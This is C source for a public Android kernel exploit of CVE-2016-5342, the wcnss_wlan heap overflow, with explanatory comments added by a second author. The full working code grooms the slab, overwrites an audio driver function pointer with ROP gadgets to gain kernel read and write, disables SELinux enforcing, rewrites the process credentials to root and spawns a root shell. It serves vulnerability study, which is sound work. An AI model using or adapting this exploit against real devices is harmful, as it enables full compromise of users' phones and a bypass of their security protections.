// A commented version of freener's exploit on CVE-2016-5342
// from : https://github.com/freener/exploits/blob/master/CVE-2016-5342/exploit_mp3_bypass_pxn.c

/*
 *  freener.gdx@gmail.com
 *
 *	root@bacon:/data/local/tmp # ./exploit_mp3_bypass_pxn                      
 *	[+] Begin to Test Exploit
 *	[+] uid=0 euid=0
 *	[+] change to system
 *	[+] uid=1000 euid=1000
 *	[+] Spray SLUB Cache
 *	[+] Spray SLUB Cache Down
 *	[+] Trigger Kernel Execution Code
 *	[+] Current SELINUX Status c16a7070 = 1
 *	[+] Open wcanss_wlan again
 *	[+] Write success 0
 *	[+] CRED address : e704b000
 *	[+] Modify CRED
 *	[+] Root Success
 *	root@bacon:/data/local/tmp # 
 */

#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <malloc.h>
#include <unistd.h>
#include <sys/prctl.h>

// How many times do we want to spray 512 byte sized 'q6audio_aio' objects.
#define MAX_FD 8
// How many times do we want to spray a placeholder 512 byte object in the kmalloc-512 slab.
#define BINDER_MAX_FDS 1000

// These are hardcoded addresses and you can find them by disassembling the kernel. Some of them could probably be found in /proc/kallsyms.
#define SELINUX_ENFORCING (0xC16A7070)
#define INIT_TASK_ADDRESS (0xC14F6040)
#define COMM_OFFSET ( 0xC14F635C - INIT_TASK_ADDRESS )
#define TASK_OFFSET ( 0xC14F6218 - INIT_TASK_ADDRESS )
#define PID_OFFSET  ( 0x0 )
#define CRED_OFFSET ( COMM_OFFSET - 8 )

// This is the string to compare to task_struct->comm in the final stage of the exploit.
char *name = "freener_pwn0";

/**
 *
 *   ROP_READ
 *   C04DBE88  LDR  R0, [R2]
 *   C04DBE8C  BX   LR
 */
// This is the file descripter of the hijacked mp3 audio device which provides arbitrary read primitives.
// By ioctling to this fd, q6audio_aio->codec_ioctl function will be invoked(Refer to :
// https://android.googlesource.com/kernel/msm/+/android-5.1.0_r0.6/arch/arm/mach-msm/qdsp6v2/audio_utils_aio.h
// and https://android.googlesource.com/kernel/msm/+/android-5.1.0_r0.6/arch/arm/mach-msm/qdsp6v2/audio_mp3.c )
// which is overwritten with the address of the ROP_READ gadget, hence providing us a neat
// 'Read 4 bytes anywhere' primitive. A value from kernel memory is read from the ioctl argument 'address', and returned to userspace.
// This doesn't work as is in Aarch64 because ioctl will transform a negative return value into a fixed value.
// Hence, you'll have to create a custom baked ioctl syscall removing the last lines of code that transforms the return value. This isn't particularly hard to do
// and have been used in other people's exploits.
int read_fd = 0;

// One would simply disassemble the kernel and search for those sequence of gadgets. Since it is a small(8 or 4 byte) sequence, it is relatively easy to find.
#define ROP_READ  ( 0xC04DBE88 )
// 'dummy' is just a marker and is irrelevant. By providing 'address' with an address where you want to read a value out of the kernel,
// You can read out 4 bytes from the kernel using the following code. ioctl will call q6audio_aio->codec_ioctl, which is overwritten by ROP_READ
// and ROP_READ will read back 4 bytes from the kernel using the supplied address(which goes into $r2).
unsigned int kernel_read( unsigned int dummy, unsigned int address )
{
    unsigned int value;
    value = ioctl( read_fd, dummy, address );
    return value;
}

/**
 *   ROP_WRITE GATGAD
 *   C0760FE4   STR R2, [R1]
 *   C0760FE8   BX  LR
 */
// One would simply disassemble the kernel and search for those sequence of gadgets. Since it is a small(8 or 4 byte) sequence, it is relatively easy to find.
#define ROP_WRITE ( 0xC0760FE4 )
// This is the file descripter of the hijacked mp3 audio device which provides arbitrary write primitives.
int write_fd = 0;
// Same as above, address goes into $r1, and value goes into $r2. You might wonder what goes into $r0? See this : https://android.googlesource.com/kernel/msm/+/android-5.1.0_r0.6/arch/arm/mach-msm/qdsp6v2/audio_mp3.c
// static long audio_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
// ...
// ...
// ...
// default:
//   pr_debug("%s[%p]: Calling utils ioctl\n", __func__, audio);
//   rc = audio->codec_ioctl(file, cmd, arg);
// ...
// ...
// ...
// }
//
// There you have it. The kernel internal variable "file" goes into $r0 and we can't control it, so it is not of any use to us.
void kernel_write( unsigned int address, unsigned int value )
{
    ioctl( write_fd, address, value );
}


// The UID of system_server
#define AID_SYSTEM 1000


int main( int argc, char **argv )
{
    int fd[MAX_FD];
    int binder_fd[BINDER_MAX_FDS];

    // You can change your own task_struct->comm name by using this syscall. This serves as a nice marker
    // to search through, and find my own process's task_struct within the task_struct linked list.
    prctl( PR_SET_NAME, (unsigned long)name, 0, 0, 0 );

    printf( "[+] Begin to Test Exploit\n" );
    int i = 0;

    // This driver is only accessible from system or AID_WIFI.
    // You need to have escalated to system_server to use this exploit.
    printf( "[+] uid=%d euid=%d\n", getuid(), geteuid() );
    setgid( AID_SYSTEM );
    setuid( AID_SYSTEM );
    printf( "[+] change to system\n" );
    printf( "[+] uid=%d euid=%d\n", getuid(), geteuid() );
    
    // If you look at https://android.googlesource.com/kernel/common.git/+/android-3.4/drivers/staging/android/binder.c,
    // "struct binder_proc" is sufficiently large to fit in to the kmalloc-512 slab(which our vulnerable object will be place in).
    // We can use any struct to defragment the heap for heap feng-shui preparation, and the 'binder_proc' object is chosen for this.
    // You can create as many objects as you want by simply opening /dev/binder, and "static int binder_open(struct inode *nodp, struct file *filp) {"
    // will create the object(........ proc = kzalloc(sizeof(*proc), GFP_KERNEL); .........) for us in kernel memory and stay there as long as we don't close the file descriptor.
    printf( "[+] Spray SLUB Cache\n" );
    for( ; i < BINDER_MAX_FDS; i++ ) {
        binder_fd[i] = open( "/dev/binder", O_RDWR );
        if ( binder_fd[i] < 0 ) {
            printf( "[-] Can not open binder %d\n", i ); 
            return -1;
        }
    }

    // This is the target object that we want to overwrite. By opening /dev/msm_mp3, according to https://android.googlesource.com/kernel/msm/+/android-5.1.0_r0.6/arch/arm/mach-msm/qdsp6v2/audio_mp3.c,
    // "static int audio_open(struct inode *inode, struct file *file) {" will be called and a 'q6audio_aio' object as per "audio = kzalloc(sizeof(struct q6audio_aio), GFP_KERNEL);" will be created.
    // This object is also sufficiently large to fit in the kmalloc-512 slab, and by looking at it's definition in https://android.googlesource.com/kernel/msm/+/android-5.1.0_r0.6/arch/arm/mach-msm/qdsp6v2/audio_utils_aio.h,
    // it has an interesting member at the very end called "long (*codec_ioctl)(struct file *, unsigned int, unsigned long);". This is the function pointer that we will try to target and overwrite.
    // After successive heap grooming in the previous binder spray, not so many objects need to be allocated to achieve a deterministic heap layout, so only 8(MAX_FD) objects are allocated.
    for ( i=0; i < MAX_FD; i++ ) {
        fd[i] = open( "/dev/msm_mp3", O_RDWR | O_NONBLOCK );
        if ( fd[i] < 0 ) {
            printf( "[-] Can not open /dev/msm_mp3\n" );
            return -1;
        }
    }

    printf( "[+] Spray SLUB Cache Down\n" );

    // fd of the vulnerable character device that we want to communicate with
    int fd_wlan;
    // The buffer to our payload
    char *buffer1 = NULL;
    // The payload length. This includes the length of the data that will be overflowed
    int message1_len = 512 + 0x150+4  - 4;

    // Opening the vulnerable character device
    fd_wlan = open( "/dev/wcnss_wlan", O_RDWR );
    if ( fd_wlan < 0 ) {
        printf( "[-] Can not open /dev/wcnss_wlan\n" );
        return -1;
    }

    // Preparing space for our payload. +4 is to compensate for the programmatic error. This will be explained later.
    buffer1 = (char *)malloc( message1_len + 4 );
    if ( buffer1 == NULL ) {
        printf( "[-] No enough memory\n" );
        return -1;
    }
    memset( buffer1, 0, message1_len+4 );


    // Now is the time to talk about the actual vulnerability. Let's start by looking at the patch diff : https://source.codeaurora.org/quic/la/kernel/msm-3.18/commit/?id=579e796cb089324c55e0e689a180575ba81b23d9,
    // and browse to the vulnerable version of the code : https://source.codeaurora.org/quic/la/kernel/msm-3.18/tree/drivers/net/wireless/wcnss/wcnss_wlan.c?h=LA.HB.0.3&id=450bd44ddaa3d0d13fa09a4a3351228feadef1ff
    /*
    #define MAX_CALIBRATED_DATA_SIZE  (64*1024)
    
    static const struct file_operations wcnss_node_fops = {
        .owner = THIS_MODULE,
        .open = wcnss_node_open,
        .read = wcnss_wlan_read,
        .write = wcnss_wlan_write,      // <- write to this character device will trigger this
    };
    
    // If we issue write(/dev/wcnss_wlan's file descriptor, our buffer in userspace, our buffer's size) to '/dev/wcnss_wlan',
    // then it will be passed into this kernelland function and placed in fp(this will be converted into the actual file* struct), user_buffer, count respectively.
    static ssize_t wcnss_wlan_write(struct file *fp, const char __user *user_buffer, size_t count, loff_t *position)
    {
        int rc = 0;
        u32 size = 0;

        if (!penv || !penv->device_opened || penv->user_cal_available)
            return -EFAULT;

        if (penv->user_cal_rcvd == 0 && count >= 4
                && !penv->user_cal_data) {
            rc = copy_from_user((void *)&size, user_buffer, 4);         // we copy first 4 bytes from our controlled buffer into the local variable 'size'.
            if (!size || size > MAX_CALIBRATED_DATA_SIZE) {             // 'size' cannot be bigger than 64*1024(MAX_CALIBRATED_DATA_SIZE)
                pr_err(DEVICE " invalid size to write %d\n", size);
                return -EFAULT;
            }

            rc += count;
            count -= 4;                                                 // Our buffer's "real size(count)" is decreased by 4.
            penv->user_cal_exp_size =  size;
            penv->user_cal_data = kmalloc(size, GFP_KERNEL);            // A buffer of 'size' is kamalloc'd and stored in 'penv->user_cal_data'
            if (penv->user_cal_data == NULL) {
                pr_err(DEVICE " no memory to write\n");
                return -ENOMEM;
            }
            if (0 == count)
                goto exit;

        } else if (penv->user_cal_rcvd == 0 && count < 4)
            return -EFAULT;

        if ((UINT32_MAX - count < penv->user_cal_rcvd) || MAX_CALIBRATED_DATA_SIZE < count + penv->user_cal_rcvd) {
            // So... (UINT32_MAX - count < penv->user_cal_rcvd) is trying to prevent an integer overflow.
            // 'penv->user_cal_rcvd' is 0 on the very first write, so basically it's only checking (MAX_CALIBRATED_DATA_SIZE < count).
            // So the size of the buffer that we're going to write to the character device must be lower than 64*1024 in order to pass through. A condition that we can easily satisfy. :)
            pr_err(DEVICE " invalid size to write %zu\n", count + penv->user_cal_rcvd);
            rc = -ENOMEM;
            goto exit;
        }
        // And here comes the vulnerability! Now remember that 'penv->user_cal_data' was allocated with the 'size' variable?
        // But look... it's copying with the length of 'count'! 'count'(our buffer's real size) does not equal 'size'(first 4 bytes read from our buffer).
        // This is a totally strong primitive where you can control both the allocation size, and the overflow length, along with the exact contents of the overflow data! Game over. :)
        //
        // As a side note, there is a minor programatic error here(that's not even fixed in the current patch). Can you spot it?
        // If you remember 'count -= 4;' from above, you will notice that the following line of code is wrong and should have been :
        // rc = copy_from_user((void *)penv->user_cal_data + penv->user_cal_rcvd, user_buffer + 4, count);
        // It's not accounting for the 4 bytes that we already read. Hence, when copying from userspace, it will only copy 'real_buffer_size - 4' amount of bytes into the allocated buffer.
        // This explains the reason for the seemingly mysterious +4 from above (buffer1 = (char *)malloc( message1_len + 4 );). It's basically just adding 4 dummy bytes in the end.
        rc = copy_from_user((void *)penv->user_cal_data + penv->user_cal_rcvd, user_buffer, count);
        if (0 == rc) {
            penv->user_cal_rcvd += count;
            rc += count;
        }
        if (penv->user_cal_rcvd == penv->user_cal_exp_size) {
            penv->user_cal_available = true;
            pr_info_ratelimited("wcnss: user cal written");
        }

    exit:
        return rc;
    }
    */
    
    int length = 512;
    // And now you can understand the code that follows. Length is setting the first four bytes that will be stored in 'size'.
    *(unsigned int *)buffer1 = length;
    // Everything after 'buffer1 + length' will be data stored after the kmalloc(size)'ed allocation. We will eventually try to overflow a 'q6audio_aio' object that's allocated after our kmalloc'd object,
    // and copy data all the way until q6audio_aio->codec_ioctl. By overwriting this struct member with the ROP_READ gadget address,
    // subsequent ioctls to the overwritten object will actually call into the ROP_READ gadget and execute it.
    *(unsigned int *)(buffer1 + length + 0x14C) = ROP_READ;


    int count = 0;
    // By closing one handle to '/dev/msm_mp3', the corresponding 'q6audio_aio' will be cleaned up and freed from memory. There is a high chance that the succeeding allocation also contains a
    // 'q6audio_aio' object, so we will try to place our kmalloc(size) vulnerable object right in this hole.
    close( fd[0] );
    // Writing to the '/dev/wcnss_wlan' will trigger the 'wcnss_wlan_write' function and thus trigger the vulnerability. We pass in the perfectly set up 'buffer1',
    // so the kmalloc(size) buffer will overflow into the next object. At this point, the 'q6audio_aio' following the buffer will be corrupted with our controlled data.
    count = write( fd_wlan, buffer1, message1_len + 4 );

    printf( "[+] Trigger Kernel Execution Code\n" );
    int result;
    // See this : https://android.googlesource.com/kernel/msm/+/android-5.1.0_r0.6/arch/arm/mach-msm/qdsp6v2/audio_mp3.c
    // Follow the codeflow in "static long audio_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {"
    // Since the ioctl cmd is 0x40046144, which doesn't fit in any of the cases, it'll go to default: and run, "rc = audio->codec_ioctl(file, cmd, arg);".
    // However, (q6audio_aio*)audio->codec_ioctl is overwritten by ROP_READ, which simply reads a value from [$r2], which is the third variable 'arg' of the ioctl and stores it in $r0 and returns.
    // The $r0 will eventually return to userland via the return value of the ioctl function itself, and this effectively creates an arbitrary 4 byte read primitive in kernelland.
    // The following is attempting to read the SELINUX_ENFORCING global variable from kernel and checking if it is the expected value 0x1(enforcing).
    // It is assuming that the q6audio_aio object for fd[1] is placed right after the q6audio_aio for fd[0]. Therefore, if the kmalloc(size) takes fd[0] q6audio_aio object's place upon
    // closing fd[0], the vulnerability would overflow into the q6audio_aio of fd[1].
    result  = ioctl( fd[1], 0x40046144, SELINUX_ENFORCING );
    // The ioctl cmd is a bogus number and should have returned -1. But if the return value is 0x1, then it means our overflow has worked just as expected
    // and our ROP_READ gadget has been called instead of the original audio->codec function.
    if ( result != 0x1 ) {
        printf( "[-] Read Kernel Failed  %x\n", result );
        return -1;
    }

    // We know that this exploit primitive works, so we will save this fd to use it whenever we want to read something from the kernel.
    read_fd = fd[1];
    // If you go back to "wcnss_wlan_write", then you will know that subsequent writes will accumulate to the kmalloc(size) buffer. We could very well just keep writing past the overwritten q6audio_aio because
    // "if (penv->user_cal_rcvd == penv->user_cal_exp_size) {" this condition is very easy to bypass and we could just keep overflowing until the next q6audio_aio for fd[2]. But the exploit author decided 
    // to just start from a clean state again so minor chances of inconsistencies may not occur. An astute reader who reviewed the source of https://source.codeaurora.org/quic/la/kernel/msm-3.18/tree/drivers/net/wireless/wcnss/wcnss_wlan.c
    // may have noticed that even when the fd_wlan char device is closed, penv->user_cal_data is not kfreed(and not even krefed so not freed) so a memory leak will occur. Hence, we do not have to care about another
    // hole appearing because of this close(fd_wlan) and we could just happily repeat the previous steps again.
    close( fd_wlan );

    printf( "[+] Current SELINUX Status %x = %x\n",SELINUX_ENFORCING , result );
    // Starting from a new clean state. Opening another '/dev/wcnss_wlan' might trigger some allocations, but it doesn't place anything on the kmalloc-512 slab so no worries.
    fd_wlan = open( "/dev/wcnss_wlan", O_RDWR );
    if ( fd_wlan < 0 ) {
        printf( "[-] Can not open /dev/wcnss_wlan\n" );
        return -1;
    }

    printf( "[+] Open wcanss_wlan again\n" );

    // Doing the same thing over again, except, this time the target function will be overwritten with ROP_WRITE.
    *(unsigned int *)(buffer1 + length + 0x14C) = ROP_WRITE;
    // Creating a hole in the kmalloc-512 slab. Hopefully, fd[5]'s q6audio_aio will be sitting right next it.
    close(fd[4]);
    // Boom! overwriting the fd[5]'s (q6audio_aio)audio->codec with ROP_WRITE. Hopefully everything went right and we have successfully created a 'Write 4 bytes anywhere' primitive.
    count = write( fd_wlan, buffer1, message1_len + 4 );
    // Assuming nothing went wrong, upon invoking the ioctl, ROP_WRITE will be called instead.
    // The 2nd arg(SELINUX_ENFORCING) will be passed down to $r1 and 3rd arg(0x0) to $r2, and the following ROP_WRITE gadget will be executed.
    /**
    *   ROP_WRITE GATGAD
    *   C0760FE4   STR R2, [R1]
    *   C0760FE8   BX  LR
    */
    result = ioctl( fd[5], SELINUX_ENFORCING, 0x0);

    // Using our previously verified read primitive, we will check if the SELINUX_ENFORCING indeed changed from 0x1 -> 0x0.
    result  = ioctl( fd[1], 0x40046144, SELINUX_ENFORCING );

    // Write success!
    if ( result != 0x0) {
        printf( "[-] Write Kernel Failed  %x\n", result );
        return -1;
    }

    // Saving the fd so we can use it anytime later.
    write_fd = fd[5];
    printf( "[+] Write success %x\n", result );

    // From here, it would be wise to refer to : http://lxr.free-electrons.com/source/include/linux/sched.h#L1475 anytime you get confused
    /**
     *   Find MySelf
     */
    // Now that we have a arbitrary read/write primitive, we want to use this to get root. What the author is doing here is, he's basically searching through all the process's task_struct through
    // the task_struct's linked list, and he's trying to find the marker he set on the very beginning of the exploit via "prctl( PR_SET_NAME, (unsigned long)name, 0, 0, 0 );". When he found it, it means that
    // he found the task_struct for the current process, and from there on he can modify the credentials and capabilities stored in the target task_struct and effectively gain root.
    unsigned int task = 0;
    // First, he is going to read the kernal global variable init_task. This address can be found in kallsyms. It represents the task_struct of the first process to be created when the OS boots up
    // and to my knowledge, represents the 'swapper' task that takes over the CPU when in idle state. It is actually reading the value from init_task + TASK_OFFSET which is the "struct list_head tasks;" member.
    // By continuously reading this value, we can traverse the entire task_struct linked list until we find myself's task_struct.
    task = kernel_read( 0x10000001, (INIT_TASK_ADDRESS + TASK_OFFSET) );
    unsigned int cred = 0;
    unsigned int magic = 0;
    unsigned int magic1 = 0;
    unsigned int comm_address = 0;
    char comm_name[17] = { 0 };
    unsigned int comm_part_one = 0, comm_part_two = 0, comm_part_three = 0;
    do {
        //printf( "[+] TASK Address : %x\n", task );
        
        // If you look at the definition for "struct task_struct {", you will see this member "char comm[TASK_COMM_LEN];". This represents the executable name. IMO you don't really need to use
        // "prctl( PR_SET_NAME, (unsigned long)name, 0, 0, 0 );" to force set the task_struct->comm value because you could very well just change the executable name to "freener_pwn0" and everything would work just fine,
        // but just in case someone decides to change the executable name...
        // Anyway, it's calculating from the start of task_struct to get the address of comm and read the value out to compare with our pre-set marker.
        comm_address = task - TASK_OFFSET + COMM_OFFSET;
        //printf( "[+] Comm Address : %x\n", comm_address );
        // Reading the comm value 4 bytes at a time.
        comm_part_one = kernel_read( 0x20000002, task - TASK_OFFSET + COMM_OFFSET );
        comm_part_two = kernel_read( 0x20000002, task - TASK_OFFSET + COMM_OFFSET + 4 );
        comm_part_three  = kernel_read( 0x20000002, task - TASK_OFFSET + COMM_OFFSET +8 );
        (*(unsigned int *)comm_name) = comm_part_one;
        (*(unsigned int *)(comm_name+4)) = comm_part_two;
        (*(unsigned int *)(comm_name+8)) = comm_part_three;

        //printf( "[+] Command line : %s\n", comm_name );

        // This is actually checking against a hardcoded string, "freener_pwn0".
        if ( comm_part_one == 0x65657266 &&
             comm_part_two == 0x5F72656E &&
             comm_part_three == 0x306E7770 ) {
            // If it passed through the if clause, means that it found the task_struct of our own process. Now we retrieve the address of "const struct cred __rcu *real_cred;"
            // member which stores our effective uid, guid, euid etc. cred struct is defined here : http://lxr.free-electrons.com/source/include/linux/cred.h#L109
            cred = kernel_read( 0x30000003, task - TASK_OFFSET + CRED_OFFSET ); 
            printf( "[+] CRED address : %x\n", cred );
            // Within the cred struct, it's reading out the 'unsigned        magic;' value.
            magic = kernel_read( 0x40000004, cred + 12 );     
            break;
        }
        // We couldn't find our marker so goto the next task_struct in the linked list
        task = kernel_read( 0x20000002, task - TASK_OFFSET + TASK_OFFSET ); 
    // Keep traversing until we find our target task_struct
    } while ( task != (INIT_TASK_ADDRESS + TASK_OFFSET) );

    // The rare case that is unlikely going to happen
    if ( task == INIT_TASK_ADDRESS ) {
        printf( "[-] Do not find myself\n" );
    }
    if ( cred == 0 ) {
        printf( "[-] Do not get CRED address\n" );
        return -1;
    }

    // Refer to : http://lxr.free-electrons.com/source/include/linux/cred.h#L109
    // if CONFIG_DEBUG_CREDENTIALS is defined, then 3 more fields are addded to the beginning of the cred object before the uid/gids, so we have to account for them when
    // calculating the offset for the start of the uids. We can check if those fields exist with the presence of the 'magic' field values within the cred struct.
    // As a side note, CONFIG_DEBUG_CREDENTIALS will be defined on compilation if SELinux is used.
    if (  magic != 0x43736564 || magic != 0x44656144 ) {
        magic = 4;
    }
    else {
        magic = 16;
    }

    printf( "[+] Modify CRED\n" );

    // From here, we are going to set all uid/gids to 0(root), and set all capabilities to 0xFFFFFFFF(enabled). I'm not sure why he stopped at i<17 because the "kernel_cap_t    cap_ambient;"
    // member seems to be left out. My guess is that it seems to be an unimportant capability, or by default enabled.
    for ( i=0; i<17; i++ ) {
        if ( i < 8 ) {
            // Using our convenitently crafted write primitives.
            kernel_write( cred + magic + i*4, 0x0 );
        }
        // We don't want to overwrite the "unsigned        securebits;" member so skip
        else if ( i == 8 ) {
            continue;
        }
        else {
            kernel_write( cred + magic + i*4, 0xFFFFFFFF );
        }
    }

    // Now the kernel will believe that this process is executed by root, and have infinite capabilities. Hence, getuid() will return 0, and /bin/sh will be run by the process owner, that is, the now escalated root.
    if ( getuid() == 0 ) {
        printf( "[+] Root Success\n" );
        execl( "/system/bin/sh", "/system/bin/sh", NULL );
        return 1;
    }

    printf( "[+] Failed \n" );

    return 0;
}